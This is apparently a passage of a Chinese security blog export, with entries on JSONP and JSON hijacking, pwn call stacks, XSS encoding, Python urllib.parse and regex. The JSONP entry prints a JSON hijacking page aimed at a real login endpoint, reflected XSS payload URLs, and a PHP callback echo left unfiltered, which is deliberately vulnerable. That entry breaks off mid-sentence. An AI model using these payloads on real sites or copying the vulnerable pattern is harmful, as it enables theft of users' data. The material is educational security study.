</ul><h2 id="0x00-JSONP产生原因"><a href="#0x00-JSONP产生原因" class="headerlink" title="0x00 JSONP产生原因"></a>0x00 JSONP产生原因</h2><p>1、AJAX不允许跨域请求文件。<br>2、Web调用Javascript文件时不受跨域影响（拥有“src”属性的标签都可跨域）<br>3、如果想通过纯Web端跨域访问数据，就需要把远程服务器的数据装进Javascript格式的文件里。<br>4、JSON的纯字符数据格式可以简洁描述复杂数据，还被Javascript原生支持，所以客户端可以随意处理这些数据。<br>5、解决方案：Web客户端调用跨域服务器上动态生成的Javascript格式文件（一般以JSON为后缀）。客户端对JSON数据进行处理和展现。</p><a id="more"></a>


<h2 id="0x01-关于-JSONP"><a href="#0x01-关于-JSONP" class="headerlink" title="0x01 关于 JSONP"></a>0x01 关于 JSONP</h2><p>JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。JSONP利用了 HTML 里 <code>&lt;script&gt; &lt;/script&gt;</code> 元素标签，远程调用 JSON 文件来实现数据传递，客户端传递一个callback参数给服务端，服务端返回数据时将callback作为函数名包裹JSON数据，客户端定制函数处理返回的数据。</p>
<p>jsonp.html页面代码如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 得到航班信息查询结果后的回调函数</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> flightHandler = <span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        alert(<span class="string">'你查询的航班结果是：票价 '</span> + data.price + <span class="string">' 元，'</span> + <span class="string">'余票 '</span> + data.tickets + <span class="string">' 张。'</span>);</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="actionscript">    <span class="comment">// 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码）</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> url = <span class="string">"http://flightQuery.com/jsonp/flightResult.aspx?code=CA1998&amp;callback=flightHandler"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 创建script标签，设置其属性</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">    script.setAttribute(<span class="string">'src'</span>, url);</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 把script标签加入head，此时调用开始</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(script);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>remote.js文件代码如下：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">flightHandler(&#123;</span><br><span class="line">    <span class="string">"code"</span>: <span class="string">"CA1998"</span>,</span><br><span class="line">    <span class="string">"price"</span>: <span class="number">1780</span>,</span><br><span class="line">    <span class="string">"tickets"</span>: <span class="number">5</span></span><br><span class="line">&#125;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>对于实际应用过程中 callback（flightHandler） 的名称在后台实现是动态输出的。</p>
<h2 id="0x02-Json劫持"><a href="#0x02-Json劫持" class="headerlink" title="0x02 Json劫持"></a>0x02 Json劫持</h2><p>JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站通过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。一个典型的 JSON Hijacking 攻击代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">wooyun</span><span class="params">(v)</span></span>&#123;</span></span><br><span class="line">    alert(v.username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然还是随着安全意识和技术水平的提高，很多甲方公司开始重视此类安全问题，开始着手研究解决方案。其中一个方案就是验证 JSON 文件调用的来源（ Referer ）。这个方案是主要利用了 <code>&lt;script&gt;</code> 远程加载 JSON 文件时会发送 Referer ，在网站输出 JSON 数据时判断 Referer 是不是白名单合法的就可以进行防御！这个方法是可行的，但是具体实现过程中又容易导致 2 总常见的逻辑问题：<br>1、referer过滤不严谨<br>2、空 Referer</p>
<h2 id="0x02-Callback可定义"><a href="#0x02-Callback可定义" class="headerlink" title="0x02 Callback可定义"></a>0x02 Callback可定义</h2><p>在本文开头介绍 JSON 原理的就说明了可能是为了方便前段开发调用，一般输出时都是可定义的，开头提到的 php 实现的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//getUsers.php</span></span></span><br><span class="line"><span class="php">$callback = $_GET[<span class="string">'callback'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">print</span> $callback.<span class="string">'(&#123;"id" : "1","name" : "知道创宇"&#125;);'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>也就是这个可定义化的 callback 名输出点又导致了各种安全问题，当然严格上来说里面提到的具体数据输出也是可以利用的，只是本文重点强调的 callback 这个输出点。<br>1、Content-Type 与 XSS 漏洞</p>
<p>在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞，上面演示的 getUsers.php 就存在这个问题：<br><code>http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>对于 Content-Type 来说早期还有一部分人比较喜欢使用 application / javascript  而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。对于这种类型的漏洞，防御主要是从两个点去部署的：</p>
<p>a、严格定义 Content-Type: application / json</p>
<p>这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。但是凡事都有个案，在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （<code>http://127.0.0.1/getUsers.php/x.html?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>） 具体参考：<a href="http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646" target="_blank" rel="noopener">http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646</a></p>
<p>b、过滤 callback 以及 JSON 数据输出</p>
<p>这样的防御机制是比较传统的攻防思维，对输出点进行 xss 过滤。又是一个看上去很完美的解决方案，但是往往都是“事与愿违”。当年( 2011 年)一个 utf7-BOM 就复活了 n 个 XSS 漏洞。这种攻击方式主要还是存在与 IE 里(注在 IE 较新版本里已经“修复”) 也就是当我们在 callback 点输出 +/v8 这样的 utf7-BOM 的时候， IE 浏览器会把当前执行的编码认为是 utf7 ,所以我们通过 utf7 提交的 XSS 代码会被自动解码并执行。如：</p>
]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>JSONP</tag>
        <tag>Web安全</tag>
        <tag>[object Object]</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-函数调用栈</title>
    <url>/2019/10/15/Pwn-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
    <content><![CDATA[<h1 id="Pwn-函数调用栈学习"><a href="#Pwn-函数调用栈学习" class="headerlink" title="Pwn-函数调用栈学习"></a>Pwn-函数调用栈学习</h1><hr>
<p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。<br><img src="/2019/10/15/Pwn-函数调用栈/1.png" alt><br>函数调用发生和结束时调用栈的变化<br>函数状态主要涉及三个寄存器：ESP,EBP,EIP。<br>ESP（栈顶指针extended stack pointer）用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。<br>EBP（栈底指针extended base pointer）用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<br>EIP  用来存储即将执行的程序指令的地址，cpu按照EIP的存储内容读取指令并执行，EIP随之指向相邻的下一条指令，如此反复，程序就得以连续执行命令。<br>32位前缀是E(ESP、EBP、EIP)，64位前缀是R(RSP、RBP、RIP)</p>
]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>[object Object]</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-编码解码</title>
    <url>/2019/10/14/XSS-%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="跨站脚本攻击（XSS）-编码剖析"><a href="#跨站脚本攻击（XSS）-编码剖析" class="headerlink" title="跨站脚本攻击（XSS）-编码剖析"></a>跨站脚本攻击（XSS）-编码剖析</h1><hr><ul>
<li>前言： 笔者从事安全两年间，看了许多xss文章，踩过很多坑，想按照自己的想法整理一下前辈们的总结，随有了这篇文章，学会XSS，理解浏览器的编码原理是重要的部分之一。</li>
</ul><h2 id="1、浏览器的解码"><a href="#1、浏览器的解码" class="headerlink" title="1、浏览器的解码"></a>1、浏览器的解码</h2><p><img src="/2019/10/14/XSS-编码解码/1.jpg" alt></p><p>上图显示了浏览器从接收代码，到渲染完成的过程：<br>1、HTML/SVG/XHTML 解析，Webkit有三个C++的类对应这三类文档。解析这三种文件会产生一个DOM Tree。<br>2、CSS 解析，解析CSS会产生CSS规则树。<br>3、Javascript DOM，主要是通过DOM API和CSSOM API来操作DOM Tree和CSS Rule Tree.</p><a id="more"></a>



<p>浏览器最早开始解析HTML代码的时候，将标签转化为内容树中的DOM节点，此时浏览器识别标签的时候，其HTML解析器是无法识别<strong>被实体编码的内容</strong>的，（这代表，如果开发人员在服务器端实体编码了我们的代码，那么我们在这一环节将无法改变DOM树结构）只有建立起<strong>DOM树</strong>之后，才能对每个节点的内容进行渲染，在此基础上，JavaScript Dom API参与进来，可以对DOM树进行修改（包含Javascript的恶意代码会触发Javascript解释器，来改变DOM树结构和内容从而执行XSS）。而此时，CSS解析器负责解析外部CSS文件以及Style标签中的样式内容，这些信息将搭配HTML中的可见指令构建一个Rendering Tree。</p>
<h2 id="2、编码和解码发生的顺序"><a href="#2、编码和解码发生的顺序" class="headerlink" title="2、编码和解码发生的顺序"></a>2、编码和解码发生的顺序</h2><p>我们刚才讲解了浏览器的渲染过程。现在我们来看一下从我们输入恶意代码，传入到服务器，再到服务器返回给浏览器，最终浏览器渲染成网页的这段过程中，都发生了什么。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('&lt;?php echo $_GET['input'];?&gt;');"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">input</span>: <span class="number">%26</span>lt<span class="number">%5</span>cu4e00<span class="number">%26</span>gt</span><br></pre></td></tr></table></figure>

<p>假设我们输入的值为 <strong>%26lt%5cu4e00%26gt</strong> 并通过GET请求提交至服务器，服务器回对我们输入的值进行URL解码，变成 <strong>&amp;lt\u4e00&amp;gt</strong> ，服务端传回数据给浏览器，浏览器生成了DOM树，此时的代码是这样的：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('&amp;lt\u4e00&amp;gt');"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以在页面右键点击 <strong>查看网站源代码</strong> 查看源码。（注意不是F12，F12的检查元素功能看到是的经过浏览器渲染后的内容)</p>
<p>DOM树生成之后，浏览器对我们的代码进行渲染，首先对标签里的元素进行HTML实体解码，我们的代码变为了：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('&lt;\u4e00&gt;');"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span>\</span><br></pre></td></tr></table></figure>

<p>也就是f12的检查元素中显示的内容</p>
<p>然后，当我们点击链接的时候，浏览器对href中的链接发起了一个请求，执行了Javascript代码，此时Javascript解释器对我们的参数进行了Unicode解码，此时，我们的代码变成了：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('&lt;-&gt;');"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span>\</span><br></pre></td></tr></table></figure>

<p>并最终弹框。<br><img src="/2019/10/14/XSS-编码解码/2.png" alt></p>
<h2 id="3、一些注意事项"><a href="#3、一些注意事项" class="headerlink" title="3、一些注意事项"></a>3、一些注意事项</h2><p>当我们尝试使用编码来绕过过滤器时，要避免一些特殊的情况，如：<br>1、不能对Javacscript等伪协议进行URL编码，URL解码后会当做无协议处理。<br>2、在进行HTML解码的时候，不能对 <strong>“(‘</strong> 这些特殊字符进行HTML实体编码，解码后这些字符将变成普通文本。<br>3、在进行Javascript解析的时候，<strong>“(‘</strong> 这些控制字符不能进行JS编码，解码后这些符号被当做文本处理。</p>
<hr>
<h3 id="本文作者：Sh4Nn0n"><a href="#本文作者：Sh4Nn0n" class="headerlink" title="本文作者：Sh4Nn0n"></a>本文作者：Sh4Nn0n</h3><h3 id="本文首发于Sh4Nn0n’s-Blog，写文不易，转载请注明出处。"><a href="#本文首发于Sh4Nn0n’s-Blog，写文不易，转载请注明出处。" class="headerlink" title="本文首发于Sh4Nn0n’s Blog，写文不易，转载请注明出处。"></a>本文首发于<a href="http://www.sh4nn0n.com" target="_blank" rel="noopener">Sh4Nn0n’s Blog</a>，写文不易，转载请注明出处。</h3>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-urllib.parse模块</title>
    <url>/2019/10/14/Python-urllib.parse%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="Python-urllib-parse模块"><a href="#Python-urllib-parse模块" class="headerlink" title="Python-urllib.parse模块"></a>Python-urllib.parse模块</h1><hr><h2 id="模块简介"><a href="#模块简介" class="headerlink" title="模块简介"></a>模块简介</h2><p>url.parse :定义了url的标准接口，实现url的各种抽取<br>parse模块的使用：url的解析，合并，编码，解码</p><h3 id="1、urlparse"><a href="#1、urlparse" class="headerlink" title="1、urlparse()"></a>1、urlparse()</h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">from urllib.parse import urlparse</span><br><span class="line"><span class="keyword">test </span>= urlparse("https://www.baidu.com/test.php?id=1")</span><br><span class="line">print (test)</span><br></pre></td></tr></table></figure><a id="more"></a>



<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">ParseResult(<span class="attribute">scheme</span>=<span class="string">'https'</span>, <span class="attribute">netloc</span>=<span class="string">'www.baidu.com'</span>, <span class="attribute">path</span>=<span class="string">'/test.php'</span>, <span class="attribute">params</span>=<span class="string">''</span>, <span class="attribute">query</span>=<span class="string">'id=1'</span>, <span class="attribute">fragment</span>=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<p>将url分为6个部分，返回一个包含6个字符串项目的元组：协议、位置、路径、参数、查询、片段。</p>
<h3 id="2、urlsplit"><a href="#2、urlsplit" class="headerlink" title="2、urlsplit()"></a>2、urlsplit()</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">from urllib<span class="selector-class">.parse</span> import urlsplit</span><br><span class="line">test2= urlsplit(<span class="string">"https://www.baidu.com/test.php?id=1"</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(test2)</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SplitResult(<span class="attribute">scheme</span>=<span class="string">'https'</span>, <span class="attribute">netloc</span>=<span class="string">'www.baidu.com'</span>, <span class="attribute">path</span>=<span class="string">'/test.php'</span>, <span class="attribute">query</span>=<span class="string">'id=1'</span>, <span class="attribute">fragment</span>=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<p>和urlparse差不多，将url分为5部分，返回一个包含5个字符串项目的元组：协议、位置、路径、查询、片段。</p>
<h3 id="3、urlunparse"><a href="#3、urlunparse" class="headerlink" title="3、urlunparse()"></a>3、urlunparse()</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">from urllib<span class="selector-class">.parse</span> import urlunparse</span><br><span class="line">url_parmas = (<span class="string">'https'</span>, <span class="string">'baidu.com'</span>, <span class="string">'/info/123456'</span>, <span class="string">''</span>, <span class="string">'wd=123&amp;page=20'</span>, <span class="string">'home'</span>)</span><br><span class="line">result = urlunparse(url_parmas)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>baidu.com<span class="regexp">/info/</span><span class="number">123456</span>?wd=<span class="number">123</span>&amp;page=<span class="number">20</span><span class="comment">#home</span></span><br></pre></td></tr></table></figure>

<p>实现URL的构造，<strong>def urlunparse(components)</strong>其中components:是一个可迭代对象，长度必须为6</p>
<h3 id="4、urljoin"><a href="#4、urljoin" class="headerlink" title="4、urljoin()"></a>4、urljoin()</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from urllib.parse import urljoin</span><br><span class="line">base_url = <span class="string">"https://www.baidu.com/home1/addurl/content?id=1"</span></span><br><span class="line">sub_url = <span class="string">"/home2/addurl/content?id=2"</span></span><br><span class="line">print (urljoin(base_url,sub_url))</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.baidu.com<span class="regexp">/home2/</span>addurl<span class="regexp">/content?id=2</span></span><br></pre></td></tr></table></figure>

<p>传递一个基础链接,根据基础链接可以将某一个不完整的链接拼接为一个完整链接</p>
<h3 id="5、urlencode"><a href="#5、urlencode" class="headerlink" title="5、urlencode()"></a>5、urlencode()</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">from urllib<span class="selector-class">.parse</span> import urlencode</span><br><span class="line">test1 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"page"</span>:<span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line">test1_str = urlencode(test1)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(test1_str)</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">id</span>=<span class="number">1</span>&amp;page=<span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>urlencode()将字典构形式的参数序列化为url编码后的字符串（常用来构造get请求和post请求的参数）key1=value1&amp;key2=value2</p>
<h3 id="6、qoute"><a href="#6、qoute" class="headerlink" title="6、qoute()"></a>6、qoute()</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">from urllib<span class="selector-class">.parse</span> import quote</span><br><span class="line">word = <span class="string">"中文"</span></span><br><span class="line">url = <span class="string">'http://www.baidu.com/s?wd='</span>+quote(word)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(quote(word)</span></span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(url)</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">%E4</span><span class="symbol">%B8</span><span class="symbol">%AD</span><span class="symbol">%E6</span><span class="symbol">%96</span><span class="symbol">%87</span></span><br><span class="line">http://www.baidu.com/s?wd=<span class="symbol">%E4</span><span class="symbol">%B8</span><span class="symbol">%AD</span><span class="symbol">%E6</span><span class="symbol">%96</span><span class="symbol">%87</span></span><br></pre></td></tr></table></figure>

<p>quote()可以将中文转换为URL编码格式</p>
<hr>
<h3 id="本文作者：Sh4Nn0n"><a href="#本文作者：Sh4Nn0n" class="headerlink" title="本文作者：Sh4Nn0n"></a>本文作者：Sh4Nn0n</h3><h3 id="本文首发于Sh4Nn0n’s-Blog，写文不易，转载请注明出处。"><a href="#本文首发于Sh4Nn0n’s-Blog，写文不易，转载请注明出处。" class="headerlink" title="本文首发于Sh4Nn0n’s Blog，写文不易，转载请注明出处。"></a>本文首发于<a href="http://www.sh4nn0n.com" target="_blank" rel="noopener">Sh4Nn0n’s Blog</a>，写文不易，转载请注明出处。</h3>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-正则表达式</title>
    <url>/2019/10/12/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Python-正则表达式"><a href="#Python-正则表达式" class="headerlink" title="Python-正则表达式"></a>Python-正则表达式</h1><hr><h2 id="1-正则表达式"><a href="#1-正则表达式" class="headerlink" title="1.正则表达式"></a>1.正则表达式</h2><p>正则表达式用来匹配特定的字符串，python中提供RE模块进行正则表达式匹配。</p><h3 id="1-1-正则表达式语法"><a href="#1-1-正则表达式语法" class="headerlink" title="1.1 正则表达式语法"></a>1.1 正则表达式语法</h3><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="string">\w</span>    <span class="comment"># 匹配任意字母、数字、下划线</span></span><br><span class="line"><span class="string">\W</span>    <span class="comment"># 匹配任意非字母、数字、下划线</span></span><br><span class="line"><span class="string">\d</span>    <span class="comment"># 匹配数字</span></span><br><span class="line"><span class="string">\D</span>    <span class="comment"># 匹配所有的非数字</span></span><br><span class="line"><span class="string">\s</span>    <span class="comment"># 匹配空白符号(空格、Tab等)</span></span><br><span class="line"><span class="string">\S</span>    <span class="comment"># 匹配所有非文本</span></span><br><span class="line">.     <span class="comment"># 匹配任意字符1次</span></span><br><span class="line">*     <span class="comment"># 匹配前面的表达式0/n次 \d*</span></span><br><span class="line">+     <span class="comment"># 匹配前面的表达式1/n次 \d+</span></span><br><span class="line">?     <span class="comment"># 匹配前面的表达式0/1次</span></span><br><span class="line">&#123;m&#125;   <span class="comment"># 匹配前面的表达式m次</span></span><br><span class="line">&#123;m,&#125;  <span class="comment"># 匹配前面的表达式N到无穷</span></span><br><span class="line">&#123;,n&#125;  <span class="comment"># 匹配前面的表达式0到M次</span></span><br><span class="line">&#123;m,n&#125; <span class="comment"># 匹配前面的表达式m到n次 \d&#123;m,n&#125;</span></span><br><span class="line">*?    <span class="comment"># 匹配前面的表达式0次</span></span><br><span class="line">+?    <span class="comment"># 匹配前面的表达式1次</span></span><br><span class="line">[]    <span class="comment"># 字符集 [a-zA-Z0-9\_]</span></span><br><span class="line">()    <span class="comment"># 分组</span></span><br><span class="line">|     <span class="comment"># 或运算 (p|P)ython</span></span><br><span class="line">^     <span class="comment"># 开始符 ^\d</span></span><br><span class="line">$     <span class="comment"># 结尾符 \d$</span></span><br></pre></td></tr></table></figure><a id="more"></a>



<p>这里需要提到一个概念，正则表达式分为<strong>贪婪</strong>和<strong>非贪婪</strong>模式，而python中数量词默认是<strong>贪婪</strong>的，尽可能匹配多的字符，贪婪模式下字符串查找会直接走到字符串末尾进行，如果不相等就向前寻找，称为回溯。</p>
<h3 id="1-2-常用匹配的正则语法"><a href="#1-2-常用匹配的正则语法" class="headerlink" title="1.2 常用匹配的正则语法"></a>1.2 常用匹配的正则语法</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">1.汉字：[<span class="tag">\<span class="name">u</span></span>4e00-<span class="tag">\<span class="name">u</span></span>9fa5]&#123;0,&#125;</span><br><span class="line">2.英文和数字：[A-Za-z0-9]+</span><br><span class="line">3.长度为3-20的所有字符：.&#123;3,20&#125;</span><br><span class="line">4.Email地址：<span class="tag">\<span class="name">w</span></span>+([-+.]<span class="tag">\<span class="name">w</span></span>+)@<span class="tag">\<span class="name">w</span></span>+([-.]<span class="tag">\<span class="name">w</span></span>+).<span class="tag">\<span class="name">w</span></span>+([-.]<span class="tag">\<span class="name">w</span></span>+)*</span><br><span class="line">5.域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.?</span><br><span class="line">6.InternetURL：[a-zA-z]+://[^<span class="tag">\<span class="name">s</span></span>] 或 ^http://([<span class="tag">\<span class="name">w</span></span>-]+.)+[<span class="tag">\<span class="name">w</span></span>-]+(/[<span class="tag">\<span class="name">w</span></span>-./?<span class="comment">%&amp;=])?$</span></span><br><span class="line">7.手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])<span class="tag">\<span class="name">d</span><span class="string">&#123;8&#125;</span></span><span class="formula">$</span></span><br><span class="line"><span class="formula">8.国内电话号码：<span class="tag">\<span class="name">d</span><span class="string">&#123;3&#125;</span></span>-<span class="tag">\<span class="name">d</span><span class="string">&#123;8&#125;</span></span>|<span class="tag">\<span class="name">d</span><span class="string">&#123;4&#125;</span></span>-<span class="tag">\<span class="name">d</span><span class="string">&#123;7&#125;</span></span>(0511-4405222、021-87888822)</span></span><br><span class="line"><span class="formula">9.日期格式：^<span class="tag">\<span class="name">d</span><span class="string">&#123;4&#125;</span></span>-<span class="tag">\<span class="name">d</span><span class="string">&#123;1,2&#125;</span></span>-<span class="tag">\<span class="name">d</span><span class="string">&#123;1,2&#125;</span></span></span></span><br><span class="line"><span class="formula">10.空白行的正则表达式：<span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name">s*</span></span><span class="tag">\<span class="name">r</span></span> (可以用来删除空白行)</span></span><br><span class="line"><span class="formula">11.腾讯QQ号：[1-9][0-9]&#123;4,&#125;</span></span><br><span class="line"><span class="formula">11.IP地址提取：<span class="tag">\<span class="name">d</span></span>+.<span class="tag">\<span class="name">d</span></span>+.<span class="tag">\<span class="name">d</span></span>+.<span class="tag">\<span class="name">d</span></span>+</span></span><br></pre></td></tr></table></figure>

